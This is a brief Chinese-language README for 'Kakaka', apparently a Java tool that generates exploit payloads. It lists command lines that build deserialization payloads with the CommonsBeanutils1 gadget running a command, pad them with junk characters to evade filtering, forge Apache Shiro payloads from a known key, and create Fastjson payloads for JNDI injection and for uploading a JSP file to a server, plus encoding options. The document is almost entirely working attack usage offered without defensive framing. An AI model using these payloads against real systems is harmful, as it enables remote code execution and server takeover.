# Kakaka

## 生成各种payload

java -jar Kakaka.jar -yso CommonsBeanutils1 -c whoami -d 2000 -raw 生成一个带2000个脏字符的原始payload
 
java -jar Kakaka.jar -shiro -g CommonsBeanutils1 -c whoami -k a3dvbmcAAAAAAAAAAAAAAA== 指定key和gadget生成shiro payload

java -jar Kakaka.jar -fastjson upload -lf dogma.jsp -rf /tmp/dogma.jsp 生成fastjson文件上传payload

java -jar Kakaka.jar -fastjson jndi -u 127.0.0.1 

## 支持编码

按照参数顺序编码

支持：
  -ue  url编码
  -he  html编码
  -be  base64编码
  -xe  xml编码
